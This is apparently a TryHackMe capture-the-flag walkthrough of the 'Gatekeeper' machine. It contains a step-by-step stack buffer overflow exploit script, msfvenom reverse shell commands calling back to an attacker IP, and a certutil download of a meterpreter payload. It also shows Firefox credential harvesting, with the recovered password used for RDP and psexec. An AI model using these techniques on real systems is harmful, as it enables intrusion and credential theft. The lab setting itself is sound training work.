---
date: 2025-02-03
categories: [CTF, THM]
title: "THM - Gatekeeper"
tags: ['nmap', 'privilege escalation', 'python', 'rce', 'reverse eng', 'smb', 'smbmap', 'windows', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "Gatekeeper - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# THM - Gatekeeper

NMAP

![image1](../resources/7c75d4cfa72f4e30b25f707c460f6466.png)


![image2](../resources/015ce57ee5d64c0ca5a06693d6a18fe3.png)


![image3](../resources/93522e6340dc468fb58cd6127e5a2594.png)

```bash
smbmap -H 10.10.59.86 -u Guest
```

![image4](../resources/23a37cd1874b480dae472ed36a8f8e70.png)

```bash
smbclient //10.10.59.86/Users -U Guest
```

![image5](../resources/ab54f283faec4b2fa1d3ae36d49b3f50.png)

```bash
get gatekeeper.exe
```

![image6](../resources/fcaefba0dbb14d76aabbbccfc616e24d.png)

- When running gatekeeper with wine

![image7](../resources/ed57dce8b12448bdbc071692cd655f78.png)

Since gatekeeper.exe is a Windows executable (and Wine isn't great) - I created a new Windows 7 VM and created an internal network between the Windows VM and Kali.

**Windows 7 - 192.168.0.2**

**Kali - 192.168.0.3**

- I installed:

```bash
VC_redist (32&64bit)

python 2.7 (32bit)

Immunity Debugger

Mona script
```

on the Windows VM

- And copied gatekeeper.exe over to it

- The open port from NMAP scan 31337 (elite) is the port that gatekeeper.exe is using

- We can test if we can crash it by creating a fuzzer

- The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent

- Create a python script to fuzz (fuzzing.py):

```python
#!/usr/bin/env python3

import socket
import time
import sys

ip = "192.168.0.2"
port = 31337
timeout = 5
prefix = "OVERFLOW1 "
string = prefix + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)

            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)

    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)

    string += "A" * 100
    time.sleep(1)

```

- Run the script:

![image8](../resources/b1c8253f59204f82b6391f7753d8b88e.png)

- Crashed at **100 bytes**

**<u>Exploit (POC - On MY Windows VM):</u>**

- We know that we can crash the executable - so we might be able to do a buffer overflow and get a reverse shell

- Create another script called exploit.py:

```python
import socket

ip = "VICTIM_IP_Gatekeeper"
port = 31337

prefix = "OVERFLOW1 "
offset = 0  # You should set this to the correct offset value
overflow = "A" * offset

retn = ""     # Return address (in little endian format)
padding = ""  # Any NOPs or alignment bytes
payload = ""  # Your shellcode or malicious payload
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")

```

- Run the following command to generate a cyclic pattern of a length **400 bytes longer** that the string that crashed the server (change the -l value to this):

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

```
**-l = 100 + 400**


![image9](../resources/d3ee710746df4d439f06c0f2f8805f91.png)

- Copy the output and **place it into** the **payload variable** of the exploit.py script

![image10](../resources/48c502dfca7148f1a4b87d814af95588.png)

- On Windows, in Immunity Debugger, re-open the gatekeeper.exe again using the same method as before, and click the red play icon to get it running.

You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications)

- On Kali, run the modified exploit.py script:

```bash
python3 exploit.py

```
- The script should crash the gatekeeper.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:

```bash
!mona findmsp -distance 500

```
- Mona should display a log window with the output of the command.
If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view)

In this output you should see a line which states:

```bash
EIP contains normal pattern : ... (offset XXXX)

```

![image11](../resources/bd0446e37b414100b3ef12729690b0e4.png)

**Offset: 136**

- Update your exploit.py script and **set the offset variable to this value** (was previously set to 0)
- **Set the payload variable** to an **empty string** again
- **Set** the **retn variable to "BBBB"**


![image12](../resources/6804294545564cf0aea244d8414ad3fe.png)

- Restart gatekeeper.exe in Immunity (Debug --\> Restart)
- Run the modified exploit.py script again

- The EIP register should now be overwritten with the 4 B's (e.g. 42424242)


![image13](../resources/59c57ef432254878ac03c9d0ecb496b3.png)


![image14](../resources/755967de11eb42f781f8985d4fbd2305.png)

**<u>Finding Bad Characters</u>**

- Generate a bytearray using mona, and exclude the null byte (\x00) by default (**\x00 is always a bad char**)

- Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration above, then the location should be **C:\mona\gatekeeper\bytearray.bin**)

```bash
!mona bytearray -b "\x00"

```

![image15](../resources/f6ef4927f58046a498729d1e33dc6086.png)


![image16](../resources/dbe7aa1ab77c439a8671ff52c79b518f.png)

- Now generate a string of bad chars that is identical to the bytearray
- The following python script can be used to generate a string of bad chars from \x01 to \xff:
(\x00 is excluded)

```python
for x in range(1, 256):
    print("\x" + "{:02x}".format(x), end='')
```

![image17](../resources/c12219c031bb4c29887e674a496f3604.png)


![image18](../resources/19dcf16c6a6d4f3cbf46aec13649cde5.png)

- Update your exploit.py script and **set** the **payload variable to the string of bad chars** the script generates


![image19](../resources/3bcf8e925e584a2da704686bd6fd2c77.png)

- Restart gatekeeper.exe in Immunity (Debug --\> Restart) and Run
- Run the modified exploit.py script again

- Make a note of the address to which the ESP register points and use it in the following mona command:

```bash
!mona compare -f C:\mona\gatekeeper\bytearray.bin -a <address>

```

![image20](../resources/fe979e7e4a2248c5b9a0a3edfeac3bb6.png)

**ESP: 022219F8**


![image21](../resources/47a797aebace4b98af90d35d1a730cde.png)


![image22](../resources/0314ea7272ad44f398deb624823f3148.png)

- A popup window should appear labelled "mona Memory comparison results"
If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file

- **Not all of these might be badchars. Sometimes badchars cause the next byte to get corrupted** as well, or even effect the rest of the string

- As we can see from the results above - **Only two bad chars are present \x00 and \x0a**
- We know that \x00 has been excluded already since it's a bad char, so the only one left to **remove** is **\x0a**

- **Generate a new bytearray in mona**, specifying the **new badchar along with \x00**:

```bash
!mona bytearray -b "\x00\x0a"
```
(Add one at a time, if there were many)


![image23](../resources/b7dd6b7ba71e45578e74f4bf04bdf0f7.png)

- Then **update the payload variable** in your **exploit.py** script and remove the new badchar as well
(Remove one at a time, if there were many)


![image24](../resources/7e88eede11f140cba60b5ad127e25597.png)

\# \x0a removed

- Immunity Debugger --\> Debug --\> Restart ----\> Run
- Run the exploit.py again


![image25](../resources/a272f946f9a144f58ac08ff98024d195.png)

ESP: 007119F8

- Compare the results:

```bash
!mona compare -f C:\mona\gatekeeper\bytearray.bin -a <ESP_address>

```

![image26](../resources/21699d07461b43d0b19c44912fffbbcf.png)

- Mona shows us that the normal shellcode is unmodified - which is what we want

**<u>Finding a Jump Point</u>**

- With gatekeeper.exe either running or in a crashed state, run the following mona command, making sure to **update** the **-cpb option** with all the **badchars you identified** (including \x00):

```bash
!mona jmp -r esp -cpb "\x00\x0a"

```

![image27](../resources/e2fc65d31f984c3ea277b02f21683bba.png)

- This command finds all "jmp esp" (or equivalent) instructions with addresses that don't contain any of the badchars specified
The results should display in the "Log data" window (use the Window menu to switch to it if needed)

- Choose an address and update your exploit.py script, **setting the "retn" variable to the address**, **written backwards** (since the system is **little endian**)
For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit


![image28](../resources/a649d563663149e3b31d1b93ac8d5acd.png)

**ESP Address: 080414C3**

**Little Endian: \xC3\x14\x04\x08**


![image29](../resources/506db26d48ea44e0a5bbf86b87a2c24f.png)

**<u>Generate Payload</u>**

- Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c

```
- Copy the generated C code strings and integrate them into your exploit.py script payload variable using the following notation:


![image30](../resources/8e53b630bc0842b79f3369df5f5f945d.png)


![image31](../resources/72f6696649ef4f93aa79cb93a3ef4cc3.png)


![image32](../resources/ccd8407ff2ea4279ac75537aba9cfccd.png)

**<u>Prepend NOPs</u>**

- Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more "No Operation" (\x90) bytes:

```bash
padding = "\x90" * 16

```

![image33](../resources/6017c5d4c7e6499d87de06cbb49729de.png)

**<u>Exploit</u>**

- With the correct prefix, offset, return address, padding, and payload set, you can now exploit the buffer overflow to get a reverse shell

- Start nc:

```bash
nc -lnvp 4444

```
- Restart gatekeeper.exe in Immunity and Run
- Run the modified exploit.py script again


![image34](../resources/f92c54857da2478795238f21a40efacf.png)


![image35](../resources/cbd3223242074007be51d0768a11afbc.png)

- The buffer overflow worked - got a reverse shell

<u>Complete exploit.py script:</u>


![image36](../resources/d432c8908a0347ceaae98ca44c7f2c29.png)

**<u>Exploit (THM Machine):</u>**

- We have the exact payload to use to exploit and get a reverse shell back

- We just need to change the IP address from my local to my tun0 address - and generate new shellcode:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.24.66 LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c

```
- Copy the newly generated shellcode into the payload variable in exploit.py


![image37](../resources/3f84341f29024c6a87acaa3392e596dd.png)

- Change the ip variable in exploit.py


![image38](../resources/8201b19f96564ef3b0e14733635bb572.png)

- Set up nc listener:

```bash
nc -lnvp 4444

```
- Run exploit.pywhoami


![image39](../resources/ab1fc30aecc34bc69b7e89c83f499236.png)


![image40](../resources/cecbaf4e7b5f4eb8a27160475b917677.png)


![image41](../resources/43a205fa37ae4ca48231485d48f68489.png)

Boom! Got it!

- Complete exploit.py:

![image42](../resources/1c0db10920c441d8bf51c385df786d40.png)

**<u>Priv Esc:</u>**

```bash
whoami /all

```

![image43](../resources/4ec33f2f06804f559da09c104ec7fdd8.png)

```bash
systeminfo

```

![image44](../resources/d22378244bc348b29ee4211947df35db.png)

- From a cmd.exe prompt, we can use the following wmic command to find any services executing from non-standard locations:

```bash
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\"

```

![image45](../resources/533d54aeb65e42aaa3bdeac7d15c84d5.png)

- Checking the permissions of the folder VMware:

```bash
icacls "C:\Program Files\VMware"

```

![image46](../resources/8edb0babef2440179bfba713963ff2fb.png)

- Actually looking back in the user desktop directory:

![image47](../resources/e3becdeb5e8b4182bb13dc4e1369a4f4.png)

- We see Firefox.lnk meaning that the machine is running firefox

- In msfconsole:
Search for firefox and look for a POST/ - since we've already got a shell

```bash
post/multi/gather/firefox_creds

```

![image48](../resources/b70857365e2d4f2f8b8f347876fa001d.png)

- First we need to get a meterpreter session:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.24.66 LPORT=5555 -f exe -o reverse.exe
python -m http.server
certutil.exe -urlcache -f http://10.8.24.66:8000/reverse.exe reverse.exe
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost 10.8.24.66; set lport 5555; exploit"
```
Run reverse.exe


![image49](../resources/23ea71e8e22b4a7182e75253fb2f4680.png)

- Background session

- Now use the post exploit:

```bash
use post/multi/gather/firefox_creds

```
- Set the session

![image50](../resources/f472b1f8272d40c6972c2cdd559a3294.png)


![image51](../resources/72e75c4f61874822b6ede6fd58f673c2.png)

```bash
cd /home/hokage/.msf4/loot/

```
- We need to decrypt these firefox files:
<https://github.com/unode/firefox_decrypt>

Download firefox_decrypt.py

- Before running - we need to rename the loot files


![image52](../resources/66625e8591254e8695abc24fea0d7797.png)

- Now run the decrypter:

```bash
python3 firefox_decrypt.py ~/.msf4/loot

```

![image53](../resources/1ea71a55555d4a0196a802c35d459ed3.png)

- RDP:

```bash
xfreerdp /u:mayor /p:8CL7O1N78MdrCIsV /cert:ignore /v:10.10.198.224

```
Read root.txt

- Or psexec:

```bash
psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.198.224 cmd.exe

```